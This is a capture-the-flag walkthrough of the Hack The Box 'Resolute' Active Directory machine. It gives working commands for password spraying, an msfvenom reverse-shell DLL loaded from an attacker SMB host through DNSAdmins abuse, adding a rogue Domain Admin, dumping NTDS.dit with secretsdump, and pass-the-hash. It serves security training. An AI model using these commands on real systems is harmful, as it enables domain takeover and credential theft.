---
title: "[MEDIUM] HTB-Resolute"
draft: false
tags:
  - htb
  - "#active-directory"
  - windows
  - rpcclient
  - dnsadmins
  - ntds-dit
  - secretsdump
  - bloodhound
  - add-user
---
## Information Gathering
### Rustscan
Based on the ports open, I can tell this machine is running on **Active Directory**.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/resolute]
└─$ rustscan --addresses 10.10.10.169 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com
<snip>>
Host is up, received conn-refused (0.31s latency).
Scanned at 2024-03-18 22:27:16 EDT for 1s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49881/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```

## Enumeration
### SMB - TCP 445
I tried anonymous login to SMB but it wasn't successful:

`smbclient -N -L //10.10.10.169`

![](https://i.imgur.com/S6gVHBI.png)


Running **crackmapexec**, I discovered domain name **megabank.local** -> Added to /etc/hosts

![](https://i.imgur.com/xq3fJAa.png)


### DNS - UDP/TCP 53
Using dig, I can confirm that megabank.local exists:

`dig @10.10.10.169 megabank.local`

![](https://i.imgur.com/Wj3asbt.png)


I tried zone trasnfer but it failed:

`dig axfr @10.10.10.169`

![](https://i.imgur.com/PPOV7hR.png)


### LDAP - TCP 389/3268
I already know the domain name but I still queried for base namingcontexts: **DC=megabank,DC=local**

`ldapsearch -H ldap://10.10.10.169 -x -s base namingcontexts`

![](https://i.imgur.com/K62lEWY.png)


I tried null binding and luckily it worked! 

`ldapsearch -H ldap://10.10.10.169 -x -b "DC=megabank,DC=local"`

![](https://i.imgur.com/nX50seY.png)


However, output was too long so I first saved it to **xp-bind.txt** to be analyzed later:

`ldapsearch -H ldap://10.10.10.169 -x -b "DC=megabank,DC=local" > xb-bind.txt`

#### Analyzing LDAP outcome

Looking at the output, it was **6832** lines.

I used the command below to analyze the data, narrowing it down to **279** lines:

`cat xb-bind.txt | awk '{print $1}' | sort | uniq -c | sort -nr > xb-bind-sorted.txt`

I thoroughly went through the data but nothing useful was found other than **sAMAccountName**

`cat xb-bind.txt| grep -i 'samaccountname' | awk '{print $2}'`

With the command below, I created list of **sAMAccountNames**:

```bash
┌──(root㉿kali)-[/home/yoon/Documents/htb/resolute]
└─# cat xb-bind.txt| grep -i 'samaccountname' | awk '{print $2}' > sAMAccountNames.txt
Guest
DefaultAccount
Users
Guests
Remote
Network
Performance
Performance
Distributed
IIS_IUSRS
<snip>
marko
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

Now that I have list of account names, I was thinking of attempting on AS-REP Roasting if nothing else shows up on further enumeration. 

### RPC - TCP 135

I tried null login on RPC and luckily it worked:

`rpcclient -U "" -N 10.10.10.169`

![](https://i.imgur.com/NNCLXIY.png)


Querying **querydispinfo**, I found a note saying **Marko Novak** has a password of **Welcome123!**:

`querydispinfo`

![](https://i.imgur.com/MFmgSg0.png)

With this information, I can move on to password spraying rather than AS-REP Roasting.

## Shell as melanie
### Password Spraying
Knowing from above sAMAccountName that **Marko Novak** has account name as **marko**, I tried authenticating with the found password but it didn't worked:


`crackmapexec smb 10.10.10.169 -u marko -p Welcome123!`

![](https://i.imgur.com/0dg0rt2.png)


Since it failed, I tried on password spraying:

`crackmapexec smb 10.10.10.169 -u sAMAccountNames.txt -p Welcome123!`
![](https://i.imgur.com/0HkLMGC.png)


After some time I found a valid match: **melanie:Welcome123!**
![](https://i.imgur.com/qrq3XcE.png)


### Checking Access

User melanie had access to **smb**:

`crackmapexec smb 10.10.10.169 -u melanie -p Welcome123!`

![](https://i.imgur.com/6FxR3kC.png)



User melanie also had access to **winrm**:

`crackmapexec winrm 10.10.10.169 -u melanie -p Welcome123!`

![](https://i.imgur.com/rpBKH2b.png)


### Evil-Winrm

Now I have my first shell as user **melanie**!:

`evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!`

![](https://i.imgur.com/XMXkCBy.png)



## Privesc melanie to ryan
### Bloodhound
Since I know this machine is running on Active Directory, I first decided to run **Bloodhound**.

I first moved **SharpHound.exe** to my current folder and uploaded to evil-winrm connection:

`upload SharpHound.exe`

![](https://i.imgur.com/1Gbg7Nl.png)


Running SharpHound.exe, I get a zip file which I can download to import it to Bloodhound. 

`./SharpHound.exe`

![](https://i.imgur.com/u5Uwnw9.png)


With the zip file downloaded, I started **neo4j** and **Bloodhound**:

```bash
sudo neo4j console
bloodhound
```

I drag&drop the zip file in to bloodhound and first marked user melanie as owned.

As I always do, I first checked on **OUTBOUND OBJECT CONTROL** for user melanie but there was nothing:

![](https://i.imgur.com/ZD03d9G.png)

Next I checked for **Shortest Path from Owned Principal** but it seemed not very interesting:

![](https://i.imgur.com/bdp16FJ.png)


After looking around more, I decided user melanie has no Active Directory related privilege escalation vulnerabilities found -> **Local Enumeration**!


### Local Enumeration

Listing all the directories including hiddne ones on C:\, I discovered **PSTranscipts** directory which I don't usually see on other Windows systems:

`gci -force`

![](https://i.imgur.com/IhCBH34.png)


Looking inside, I discovered **2019103** folder and in there was **PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt**:

`type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`

```powershell
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

Looking through the txt file, It seemed that it is revealing password for user **ryan**: **Serv3r4Admin4cc123!**

![](https://i.imgur.com/rknuexL.png)


### Evil-Winrm
Now I have a shell connection as user **ryan**:

`sudo evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!`

![](https://i.imgur.com/X69qS2q.png)


## Privesc ryan to Administrator
### Bloodhound

Again uploaded and ran **SharpHound.exe**, downloaded the zip file and imported it into bloodhound:

```bash
upload SharpHound.exe
.\SharpHound.exe
download 20240318203422_BloodHound.zip
```

I can see that **ryan** is a member of **contractors** group:

![](https://i.imgur.com/ioGsSQf.png)



Checking on **OUTBOUND OBJECT CONTROL** for **contractors**, there was one:

![](https://i.imgur.com/uA66Lyd.png)



It seemed that **contractors** is a member of **DNSAdmins** group:

![](https://i.imgur.com/xPp9zlM.png)


### DNSAdmins Privilege Escalation
Searching for DNSAdmin Privilege Escalation, I had lot of articles popping up:

![](https://i.imgur.com/35ttjRT.png)


Out of all the articles, [this article](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/) by hacking articles was the one that I found it most useful.

#### Execution
I first need to check whether user ryan is actually in **DNSAdmins** group; and yes, he is in **DNSAdmins** group:

`whoami /groups`

![](https://i.imgur.com/sJb6FS9.png)


I created **dll** file that will spawn me reverse shell using msfvenom:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=443 -f dll -o rev.dll`

![](https://i.imgur.com/M98Ju5u.png)


There are several ways to transfer file to the target system but there is a possibility that malware scanner or Windows Defender might detect and remove it. Therefore, I used smbserver to transfer file over the network.

Now I host **smbserver** to have the dll file ready on it:

`smbserver.py s .`

![](https://i.imgur.com/fkO4tn8.png)



Using **dnscmd.exe**, I can pass the dll code into the memory as SYSTEM:

`dnscmd.exe /config /serverlevelplugindll \\10.10.14.18\s\rev.dll`

![](https://i.imgur.com/ej4uNYn.png)


Now only thing I have to do is to restart DNS:

`sc.exe \\resolute stop dns`

![](https://i.imgur.com/l7tsD5Q.png)



`sc.exe \\resolute start dns`

![](https://i.imgur.com/b6byaVk.png)


Now on my local listener, I have shell as the system:

`nc -lvnp 443`

![](https://i.imgur.com/TPCWM0q.png)


## Beyond Root
Above connection is a shell, but it is annoying to reproduce this procedure every time whenever needing a shell as SYSTEM. Below are some methods to maintain persistence within the system.

### Adding Domain Admin User

I can simply create a new user and add the user in Domain Admins group as such:

```bash
net user jadu jadu101 /add
net group "Domain Admins" /add jadu
```
![](https://i.imgur.com/AfmJPXJ.png)



Now with evil-winrm, I can sign in as the created user:

![](https://i.imgur.com/y8ojooG.png)


### Dumping NTDS.dit

I can dump **NTDS.dit** to obtain hashes for users and pass those hashes to gain connection to the machine.

Below command dumps **SECURITY**, **SYSTEM**, and **NTDS.dit** file to Temp folder which could be downloaded to dump password hashes:

`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`

![](https://i.imgur.com/5cMUA6O.png)


On **/Temp/registry**, I have **SECURITY** and **SYSTEM** file which I download to local machine:

```bash
download SECURITY
download SYSTEM
```
![](https://i.imgur.com/9NfYoBM.png)


On **/Temp/Active-Directory**, I have **NTDS.dit** file which I download to local machine as well:

```bash
download ntds.dit
```
![](https://i.imgur.com/ix6S7VR.png)


Now with **secretsdump**, I can obtain bunch of password hashes:

`root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`

![](https://i.imgur.com/yi7hUfY.png)


I can try to crack these hashes, but it is not necessary. I can pass the **NT** part of the hashes to gain shell connection:

![](https://i.imgur.com/OsTxNof.png)



[Here](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/lateral-movement/alternate-authentication-material/wip-pass-the-hash) are more steps you can follow once you obtain hash for Administrator.


## References
- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin
- https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/lateral-movement/alternate-authentication-material/wip-pass-the-hash




